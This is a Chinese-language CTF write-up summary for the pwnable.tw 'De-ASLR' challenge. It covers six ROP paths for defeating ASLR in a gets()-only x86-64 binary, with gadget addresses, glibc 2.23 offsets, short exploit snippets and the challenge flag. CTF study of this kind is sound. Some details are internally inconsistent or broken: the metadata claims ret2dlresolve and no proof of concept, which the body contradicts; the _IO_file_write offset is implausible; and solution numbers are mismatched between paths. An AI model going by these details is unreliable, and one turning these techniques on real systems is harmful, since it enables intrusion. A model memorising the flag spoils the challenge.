---
tags:
  - ret2dlresolve
  - rop
  - information-leak
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.23
relro: full
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "在没有任何输出函数的二进制中，利用 gets() 的栈缓冲区溢出，通过 ret2dlresolve 解析 system() 并执行 shell。"
proof-of-concept: no
---

# De-ASLR — pwnable.tw（500 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10402`
>
> Flag：`FLAG{R0P_H4rd_TO_D3F3AT_ASLR}`

## 题目概览

一个极简的 x86-64 二进制，唯一导入的函数是 `gets()`——没有输出函数、没有 `syscall` gadget、没有 `write`/`puts`/`printf`。Full RELRO 阻止 GOT 覆盖。核心挑战在于：在二进制本身**没有任何泄露通道**的情况下击败 ASLR。

```bash
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT is read-only
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)    # fixed code/data addresses
```

## 二进制分析

反编译出的程序非常简单：

```c
int main() {
    char buf[0x10];
    gets(buf);   // stack buffer overflow
    return 0;
    // compiled with: leave; ret
}
```

- 栈溢出发生在偏移 **0x18** 处（0x10 缓冲区 + 0x8 保存的 RBP），可覆盖返回地址。
- `main` 末尾的 `leave; ret` 提供了通过控制 RBP 实现**栈 pivot** 的能力。
- 可以通过 `gets@plt`（0x400430）反复调用 `gets()`，把数据分阶段放进可写内存。
- `0x601000–0x602000` 的 `.data`/`.bss` 段可写，且位于固定地址。

## 漏洞

### V1 —— 通过 `gets()` 的栈缓冲区溢出

```c
char buf[0x10];
gets(buf);  // no bounds checking, reads until newline
```

**影响：** 从偏移 0x18 起可构造任意 ROP 链。约束：payload 中不能出现换行符（`\n` / `0x0a`）。

### V2 —— 没有输出函数（真正的挑战）

该二进制只导入了 `gets`。其中没有 `write`、`puts`、`printf`，也没有 `syscall` 指令。Full RELRO 意味着 GOT 无法被覆盖。也就是说 **ASLR 无法通过传统的泄露手段破解**——利用必须做到以下之一：
- 完全依靠寄存器/内存操作用计算出 libc 地址（无泄露），或
- 从 libc 内部人为制造一个输出通道，或
- 暴力尝试部分覆盖。

## 可用 gadget

来自 `__libc_csu_init` 及其他代码（无 PIE，因此所有地址固定）：

```asm
0x4005c3: pop rdi ; ret
0x4005c1: pop rsi ; pop r15 ; ret
0x4005bd: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret    # stack pivot
0x4005ba: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x4005a0: mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]  # ret2csu CALL
0x4005a9: call [r12+rbx*8]                                # ret2csu CALL (alt entry)
0x400562: push r14 ; ... (csu_init prologue, stores r14 to stack/memory)
0x4004f8: adc dword [rbp+0x48], edx ; mov ebp, esp ; call deregister  # arithmetic write
0x4004a0: pop rbp ; ret
0x400554: leave ; ret                                      # stack pivot via RBP
0x400440: _start                                           # re-enters main, grows stack
0x400536: main
0x4003f9: ret                                              # ret sled
0x400495: jmp rax
0x4005ce: add byte ptr [rax], al ; ret                     # byte-level memory write
```

`call [r12+rbx*8]` gadget 是关键——它能通过**任意内存位置**发起间接调用（只要该位置可从某个基址指针到达），包括 GOT 表项和 libc 内部函数表。

## 利用路径

所有解法都从同样的栈溢出出发，但在如何击败 ASLR 上差异巨大。

---

### 路径 A —— 无泄露：GOT pivot + `adc` 算术 → `execve`（确定性）

**使用者：** exp.py、解法 186、2233

**思路：** 什么都不泄露。而是把已解析的 `gets@libc` 地址从只读 GOT 中 **pop** 进寄存器，**存**到可写内存，再**加上**一个常量偏移把它变成 `execve@libc`——全程只用固定地址的 gadget。

**步骤：**

1. **第一阶段溢出：** ROP 调用 `gets@plt` 把第二阶段链读进 `.data`（0x601000），然后用 `pop rsp` 把 `rsp` pivot 到 GOT 区域（0x600FE8）。

2. **从 GOT 弹出：** 在 GOT pivot 处，`pop r14` 把 `gets@got`（0x600FF0）——即**已解析的 `gets` 的 libc 地址**——加载进 `r14`。随后返回 `.data`。

3. **保存 r14：** 执行 `push r14`（经 `__libc_csu_init` 序言 0x400562），把 `gets@libc` 写到某个已知的 `.data` 槽位（例如 0x6010F0）。

4. **算术变换：** 用 `ret2csu` 设置 `edx = execve_offset - gets_offset`（= 0x5CE40），再用 `adc [rbp+0x48], edx` gadget 把该常量加到已保存的 `gets@libc` 上，使其变成 `execve@libc`。

5. **调用 execve：** 再用一次 `ret2csu` 设置 `rdi = &"/bin/sh"`（在 `.data` 中）、`rsi = 0`、`rdx = 0`、`r12 = &slot`（存放 `execve` 地址处），然后 `call [r12]` → `execve("/bin/sh", 0, 0)`。

```python
# Core offsets (libc 2.23)
GETS_OFF    = 0x6ED80
EXECVE_OFF  = 0xCBBC0
DELTA       = EXECVE_OFF - GETS_OFF  # = 0x5CE40
```

**可靠性：** 约 100% 确定性。只有当日志上极罕见的情况发生——给 `gets@libc` 的低 32 位加上 0x5CE40 时跨过 4GB 边界产生进位——才会失败。

---

### 路径 B —— 通过 `_IO_file_write` + ret2csu 泄露（确定性）

**使用者：** 解法 278、1384、18324、24887、27878、1461

**思路：** `call [r12+rbx*8]` gadget 能调用 **libc 数据段中任意函数指针**——包括 `_IO_file_jumps` / `_IO_proc_jumps` vtable 里的 `_IO_file_write`。这就人为制造出了一个 `write()` 输出通道。

**步骤：**

1. **栈 pivot** 到 `.bss`：用受控的 RBP 配合 `leave; ret`。

2. **取得一个 libc 数据指针：** 再次调用 `_start` 或 `main`——这会让 `__libc_start_main` 把 libc 地址压到新栈上。另一种做法是 `gets()` 会把 `stdin` 的地址（一个 libc 指针）存到栈上。

3. **把 libc 指针弹出** 到 `r12`：用 `pop r12; pop r13; pop r14; pop r15; ret`（0x4005BC）。

4. **计算 `rbx` 偏移**，使 `[r12 + rbx*8]` 指向 libc 数据中的某个 `_IO_file_write` 函数指针。构造一个伪造的 `FILE` 结构：`_fileno = 1`（stdout）、`rsi = GOT 地址`、`rdx = 8`（长度）。

5. **调用 `_IO_file_write`** via ret2csu → 向 stdout 泄露某个 GOT 表项（例如 `__libc_start_main@got`）的 8 个字节 → **得到 libc 基址**。

6. 返回 `main`，读入最终 payload：`pop rdi; &"/bin/sh"; system` 或 `one_gadget`。

**可靠性：** 弄清栈布局之后就是确定性的。从 libc 数据指针到 vtable 表项的 `rbx` 偏移是 libc 中的固定常量。

---

### 路径 C —— 部分覆盖 + 爆破（1/16 到 1/4096）

**使用者：** 解法 1303、2567、1980、2121、15989

**思路：** 调用 `gets()` 或 `_start` 之后，栈上或 `.bss` 中会留下 libc 地址。把这类地址的低位部分覆盖，使其指向 `one_gadget` 或 `system`。由于 ASLR 会随机化高位，这需要爆破 4–12 位。

**变体：**

- **1.5 字节覆盖（1/4096）：** 用某个 one_gadget 的低字节覆盖某段 libc 残留的 2 个字节。用 `ret` sled 填充，让链滑入其中。

  ```python
  # Solution 2567 — simplest possible exploit
  r.sendline('A'*24 + flat(ret)*18 + '\xc4\x16')  # overwrite with one_gadget low bytes
  ```

- **1 字节覆盖（1/16）：** 只覆盖 `gets()` 内部留下的某个 libc 返回地址的 1 个字节（例如把 `_IO_getline_info+292` 的低字节改到 `_IO_getline_info+208`）。然后用 `add byte ptr [rax], al` gadget 调整第二个字节。

  ```python
  # Solution 15989 — change _IO_getline_info address, use as computation gadget
  p.sendline(stage1)  # partial overwrite of libc address
  p.sendline('\x98')  # set low byte
  # ... use add [rax], al to fix second byte (1/16 brute force)
  ```

- **栈残留 + `_start` 循环：** 反复调用 `_start`，让 libc 地址被压到 `.bss` 内可预测的栈偏移处，然后覆盖它们的低字节。

**可靠性：** 每次尝试 1/16 到 1/4096。实现简单，但需要重试循环。

---

### 路径 D —— 返回 `_dl_init` / 动态链接器（进阶，确定性）

**使用者：** 解法 1626

**思路：** glibc 动态链接器（`ld.so`）会在栈上留下调用构造函数的设施。通过精心设置寄存器，并带着 `.data` 中的伪造 `link_map` 结构返回到 `_dl_init` 的构造函数分派循环，就能诱使链接器把 `gets@got + system_offset` 当作 init 函数来调用。

**步骤：**

1. 在 `.data` 中布置一个伪造的 `link_map` 结构，其 `l_info[DT_INIT]` 指向 `gets@got - 8`（以便经 GOT 间接调用）。
2. 设置 `r14 = &fake_link_map`、`rbx = 1`、`rdi = &"/bin/sh"`。
3. 返回到 `_dl_init` 的构造函数循环——它会通过结构布局预先应用的 system 偏移，调用 `[gets@got]`。

**可靠性：** 确定性，但依赖具体的链接器版本/行为。跨 glibc 版本比较脆弱。

---

### 路径 E —— `_IO_getline_info` gadget + `jmp rax`（近确定性）

**使用者：** 解法 13204

**思路：** 调用 `gets()` 之后，经由 `_IO_getline_info` 的返回路径会在栈上留下一个 libc 地址。`_IO_getline_info+208` 处的代码执行 `mov rax, rbp; sub rax, [rsp+8]; ... ret`，会在 `rax` 中算出一个任意 libc 地址。配合 `jmp rax`，这就变成 `call <libc 中任意位置>`。

**步骤：**

1. 把栈 pivot 到 `.bss`，调用 `gets()` 让 `_IO_getline_info+292` 留在栈上。
2. 用 `add byte ptr [rax], al`（0x4005CE）把低字节从 `+292` 改成 `+208`。
3. 把距离 `rbp - one_gadget` 放在 `[rsp+8]`，于是 `mov rax, rbp; sub rax, [rsp+8]` 就在 `rax` 中算出 `one_gadget`。
4. `jmp rax` → shell。

**可靠性：** 需要低字节修正成功（依赖特定的堆/栈对齐）。只要 `.bss` 地址调得对，接近确定性。

---

### 路径 F —— 伪造 `FILE` 结构 → `_IO_flush` 泄露（确定性）

**使用者：** 解法 1461

**思路：** 在 `.bss` 中伪造一个 `FILE`（`_IO_FILE`）结构，`_fileno = 1`，缓冲区指针指向 GOT。然后让 `rdi` 指向伪造 FILE 附近并调用 `gets()`——当 `gets()` 内部通过 `_IO_file_write` 刷新 stdout 时，就会把 GOT 内容写到 fd 1。

**步骤：**

1. pivot 到 `.bss`，调用 `main` 让 `_IO_2_1_stdin_` 地址落到栈上。
2. 构造伪造 FILE：`_flags = 0xFBAD0800`、`_IO_write_base = GOT`、`_IO_write_ptr = GOT+8`、`_fileno = 1`。
3. 让 `rdi` 指向伪造 FILE 区域并调用 `gets()`——内部 stdio 机制会对我们的伪造结构调用 `_IO_file_write`，把 GOT 泄露到 stdout。
4. 收到泄露、算出 libc 基址，返回 `one_gadget`。

**可靠性：** 确定性。需要理解 glibc stdio 内部机制。

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| 栈溢出 | 0x10 缓冲区的 `gets()` | 确定性 |
| 栈 pivot | `leave; ret` 或 `pop rsp` | 确定性 |
| 任意 `.bss` 写 | 通过 ROP 调用 `gets@plt` | 确定性 |
| 从 GOT 加载寄存器 | `pop rsp` 到 GOT，再 `pop r14` | 确定性 |
| 对已保存的 libc 地址做算术 | `adc [rbp+0x48], edx` | 确定性 |
| 经 libc vtable 间接调用 | `call [r12+rbx*8]` + 计算出的偏移 | 确定性 |
| 部分覆盖 libc 地址 | 覆盖栈残留的低字节 | 1/16 – 1/4096 |
| 字节级内存修改 | `add byte [rax], al` | 确定性（若能控制 rax） |

## 偏移（pwnable.tw `libc_64.so.6`，glibc 2.23）

```python
gets            = 0x6ED80
execve          = 0xCBBC0
system          = 0x45390
__libc_start_main = 0x20740
_IO_2_1_stdin_  = 0x3C38E0
_IO_file_write  = 0x7A6B70
__free_hook     = 0x3C57A8
__malloc_hook   = 0x3C3B10
bin_sh          = 0x18C177
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

## 二进制 gadget（固定，无 PIE）

```python
POP_RDI     = 0x4005C3   # pop rdi ; ret
POP_RSI_R15 = 0x4005C1   # pop rsi ; pop r15 ; ret
POP_RSP     = 0x4005BD   # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
POP6        = 0x4005BA   # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
CSU_CALL    = 0x4005A0   # mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]
CSU_INIT    = 0x400562   # push r14 ; ... (csu prologue, stores regs to stack)
ADC_WRITE   = 0x4004F8   # adc dword [rbp+0x48], edx ; mov ebp,esp ; call deregister
ADD_BYTE    = 0x4005CE   # add byte ptr [rax], al ; ret
POP_RBP     = 0x4004A0   # pop rbp ; ret
LEAVE_RET   = 0x400554   # leave ; ret (stack pivot)
GETS_PLT    = 0x400430   # gets@plt
JMP_RAX     = 0x400495   # jmp rax
RET         = 0x4003F9   # ret (nop sled)
START       = 0x400440   # _start
MAIN        = 0x400536   # main
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `186.md` | A | adc gadget + push r14，无泄露 execve | 干净的确定性解法 |
| `278.md` | B | 通过 `call [r12+rbx*8]` 调用 `_IO_new_file_write` | Ruby；用 stdin 指针 + vtable 偏移 |
| `1303.md` | C | 对 system 地址做 1.5 字节爆破 | GOT pivot 后的部分覆盖 |
| `1384.md` | B | 通过 vtable 调用 `_IO_file_write` 泄露 | 返回到 `_start` 取得 libc 指针；详细的 gadget 搜索 |
| `1461.md` | F | 伪造 FILE 结构刷新泄露 | 在 `.bss` 中构造 `_IO_FILE` |
| `1562.md` | E | `_IO_getline_info` + 栈残留 | 新颖：利用 libc 内部的栈残留 |
| `1626.md` | D | 返回到 `_dl_init` 构造函数循环 | 伪造 `link_map` 结构 |
| `1852.md` | B | 返回 `_start`/`main` + `_IO_file_write` | 用负数 `rbx` 的 `call [r12+rbx*8]` |
| `1912.md` | A 变体 | `sub eax` + `add [rax]` 算术 | 手工构造 libc 地址 |
| `1980.md` | C | 部分覆盖 one_gadget 的低字节 | 用 `add byte [rax], al` 做 1/16 爆破 |
| `2121.md` | C | `_start` 循环 + 部分覆盖 | 沉积 libc 地址，覆盖成 `system` |
| `2233.md` | A | `adc` + `__malloc_initialize_hook` | 用 malloc hook 而不是 execve |
| `2567.md` | C | 12 位爆破，三行利用 | 最简单的解法：`ret*18 + '\xc4\x16'` |
| `10128.md` | B | 通过 `_IO_file_write` 泄露 `gets@got` | C++ 利用 |
| `13204.md` | E | 把 `_IO_getline_info+208` 当作计算 gadget | 调整低字节，然后 `jmp rax` |
| `15989.md` | E | `_IO_getline_info` + `syscall; ret` | 把残留转成 syscall gadget |
| `18324.md` | B | 用负数 rbx 的 `call [r12+rbx*8]` | 通过 `_IO_file_write` 泄露 GOT |
| `24887.md` | B | ret2csu + 伪造 FILE | C++ 利用；干净的泄露链 |
| `26207.md` | B | ret2csu、`_IO_file_write` | 详细的栈管理 |
| `27878.md` | B | ret2csu、负数 `rbx` | 通过 `_IO_proc_jumps` vtable 泄露 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用的利用脚本（路径 A：无泄露的 `adc` 算术） |
| `desc.txt` | 题目描述 |
| `artifacts/deaslr` | 题目二进制（x86-64，No PIE，Full RELRO） |
| `artifacts/libc_64.so.6` | 远程 libc（glibc 2.23） |
| `solution/*.md` | 社区题解（77 篇） |
